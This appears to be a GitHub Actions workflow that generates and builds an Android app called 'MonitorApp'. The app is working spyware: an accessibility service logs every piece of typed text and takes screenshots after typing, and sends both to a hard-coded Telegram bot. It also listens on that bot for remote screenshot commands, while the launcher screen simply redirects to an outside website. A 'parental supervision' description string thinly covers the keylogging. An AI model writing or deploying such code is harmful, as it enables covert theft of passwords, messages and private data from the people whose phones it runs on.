name: Build APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3

      - name: Create project files
        run: |
          mkdir -p app/src/main/java/com/example/monitorapp
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml

          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }

          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.PREFER_PROJECT)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "MonitorApp"
          include ':app'
          EOF

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          EOF

          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.example.monitorapp'
              compileSdk 34

              defaultConfig {
                  applicationId "com.example.monitorapp"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_1_8
                  targetCompatibility JavaVersion.VERSION_1_8
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF

          cat > app/proguard-rules.pro << 'EOF'
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.monitorapp">

              <uses-permission android:name="android.permission.INTERNET" />

              <application
                  android:allowBackup="true"
                  android:icon="@android:drawable/sym_def_app_icon"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.MonitorApp">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".MonitorService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="false">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

              </application>
          </manifest>
          EOF

          cat > app/src/main/java/com/example/monitorapp/MainActivity.java << 'EOF'
          package com.example.monitorapp;

          import android.content.Intent;
          import android.net.Uri;
          import android.os.Bundle;
          import androidx.appcompat.app.AppCompatActivity;

          public class MainActivity extends AppCompatActivity {

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);

                  // Automatically open the website
                  Uri webpage = Uri.parse("https://neon-aim.vercel.app/");
                  Intent webIntent = new Intent(Intent.ACTION_VIEW, webpage);
                  startActivity(webIntent);

                  // Close this activity so the user doesn't see a blank screen
                  finish();
              }
          }
          EOF

          cat > app/src/main/java/com/example/monitorapp/MonitorService.java << 'EOF'
          package com.example.monitorapp;

          import android.accessibilityservice.AccessibilityService;
          import android.graphics.Bitmap;
          import android.graphics.ColorSpace;
          import android.hardware.HardwareBuffer;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.view.Display;
          import android.view.accessibility.AccessibilityEvent;
          import org.json.JSONArray;
          import org.json.JSONObject;
          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.FileWriter;
          import java.io.IOException;
          import java.util.concurrent.TimeUnit;
          import okhttp3.MediaType;
          import okhttp3.MultipartBody;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;

          public class MonitorService extends AccessibilityService {

              private static final String BOT_TOKEN = "8604384479:AAE5NriMLZzQNHvqE5U-SpSiegtn_Trp0SQ";
              private static final String CHAT_ID = "8534616003";

              private static final String TELEGRAM_API = "https://api.telegram.org/bot" + BOT_TOKEN;

              private Handler screenshotHandler = new Handler(Looper.getMainLooper());
              private Runnable screenshotRunnable = this::takeScreenshotAndSend;

              private OkHttpClient httpClient = new OkHttpClient.Builder()
                      .connectTimeout(15, TimeUnit.SECONDS)
                      .readTimeout(15, TimeUnit.SECONDS)
                      .build();

              private int lastUpdateId = 0;
              private Thread pollingThread;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  startTelegramPolling();
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                      if (event.getText() != null && event.getText().size() > 0) {
                          String typedText = event.getText().get(0).toString();
                          if (!typedText.isEmpty()) {
                              logToFile("[" + System.currentTimeMillis() + "] " + typedText);
                              sendTextToTelegram("⌨️ Keylog: " + typedText);
                          }
                      }
                      scheduleScreenshot();
                  }
              }

              @Override
              public void onInterrupt() {
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (pollingThread != null && pollingThread.isAlive()) {
                      pollingThread.interrupt();
                  }
              }

              private void scheduleScreenshot() {
                  screenshotHandler.removeCallbacks(screenshotRunnable);
                  screenshotHandler.postDelayed(screenshotRunnable, 2000);
              }

              private void takeScreenshotAndSend() {
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                      takeScreenshot(Display.DEFAULT_DISPLAY, getMainExecutor(),
                              new TakeScreenshotCallback() {
                                  @Override
                                  public void onSuccess(ScreenshotResult screenshotResult) {
                                      HardwareBuffer buffer = screenshotResult.getHardwareBuffer();
                                      ColorSpace colorSpace = screenshotResult.getColorSpace();
                                      Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                      if (bitmap != null) {
                                          File screenshotFile = saveBitmap(bitmap);
                                          sendPhotoToTelegram(screenshotFile, "📸 Screenshot taken after typing");
                                      }
                                      screenshotResult.getHardwareBuffer().close();
                                  }

                                  @Override
                                  public void onFailure(int errorCode) {
                                  }
                              });
                  }
              }

              private File saveBitmap(Bitmap bitmap) {
                  File dir = new File(getExternalFilesDir(null), "screenshots");
                  if (!dir.exists()) dir.mkdirs();
                  File file = new File(dir, "screenshot_" + System.currentTimeMillis() + ".png");
                  try (FileOutputStream fos = new FileOutputStream(file)) {
                      bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                  } catch (IOException e) {
                      e.printStackTrace();
                  }
                  return file;
              }

              private void sendTextToTelegram(String message) {
                  new Thread(() -> {
                      try {
                          String url = TELEGRAM_API + "/sendMessage";
                          RequestBody body = new MultipartBody.Builder()
                                  .setType(MultipartBody.FORM)
                                  .addFormDataPart("chat_id", CHAT_ID)
                                  .addFormDataPart("text", message)
                                  .build();
                          Request request = new Request.Builder()
                                  .url(url)
                                  .post(body)
                                  .build();
                          httpClient.newCall(request).execute().close();
                      } catch (IOException e) {
                          e.printStackTrace();
                      }
                  }).start();
              }

              private void sendPhotoToTelegram(File photoFile, String caption) {
                  new Thread(() -> {
                      try {
                          String url = TELEGRAM_API + "/sendPhoto";
                          RequestBody body = new MultipartBody.Builder()
                                  .setType(MultipartBody.FORM)
                                  .addFormDataPart("chat_id", CHAT_ID)
                                  .addFormDataPart("caption", caption)
                                  .addFormDataPart("photo", photoFile.getName(),
                                          RequestBody.create(MediaType.parse("image/png"), photoFile))
                                  .build();
                          Request request = new Request.Builder()
                                  .url(url)
                                  .post(body)
                                  .build();
                          httpClient.newCall(request).execute().close();
                      } catch (IOException e) {
                          e.printStackTrace();
                      }
                  }).start();
              }

              private void startTelegramPolling() {
                  pollingThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try {
                              checkForCommands();
                              Thread.sleep(15000);
                          } catch (InterruptedException e) {
                              Thread.currentThread().interrupt();
                              break;
                          } catch (Exception e) {
                              e.printStackTrace();
                          }
                      }
                  });
                  pollingThread.setDaemon(true);
                  pollingThread.start();
              }

              private void checkForCommands() {
                  try {
                      String url = TELEGRAM_API + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=0";
                      Request request = new Request.Builder().url(url).build();
                      Response response = httpClient.newCall(request).execute();
                      if (!response.isSuccessful()) return;

                      String jsonStr = response.body().string();
                      JSONObject json = new JSONObject(jsonStr);
                      JSONArray updates = json.getJSONArray("result");

                      for (int i = 0; i < updates.length(); i++) {
                          JSONObject update = updates.getJSONObject(i);
                          lastUpdateId = update.getInt("update_id");

                          if (update.has("message")) {
                              JSONObject message = update.getJSONObject("message");
                              if (message.has("text")) {
                                  String text = message.getString("text");
                                  if (text.equalsIgnoreCase("/screenshot")) {
                                      screenshotHandler.post(this::takeScreenshotAndSend);
                                  }
                              }
                          }
                      }
                  } catch (Exception e) {
                      e.printStackTrace();
                  }
              }

              private void logToFile(String data) {
                  File dir = new File(getExternalFilesDir(null), "logs");
                  if (!dir.exists()) dir.mkdirs();
                  File file = new File(dir, "keylog.txt");
                  try (FileWriter fw = new FileWriter(file, true)) {
                      fw.append(data).append("\n");
                  } catch (IOException e) {
                      e.printStackTrace();
                  }
              }
          }
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical"
              android:padding="16dp">

              <TextView
                  android:layout_width="wrap_content"
                  android:layout_height="wrap_content"
                  android:text="Redirecting..." />
          </LinearLayout>
          EOF

          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">MonitorApp</string>
              <string name="accessibility_service_description">This service monitors typed text and captures screenshots for parental supervision with consent.</string>
          </resources>
          EOF

          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="Theme.MonitorApp" parent="Theme.AppCompat.Light.NoActionBar" />
          </resources>
          EOF

          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds"
              android:canTakeScreenshot="true"
              android:notificationTimeout="100"
              android:description="@string/accessibility_service_description" />
          EOF

      - name: Generate Wrapper and Build
        run: |
          gradle wrapper --gradle-version 8.2
          chmod +x ./gradlew
          ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: app-debug-apk
          path: app/build/outputs/apk/debug/*.apk
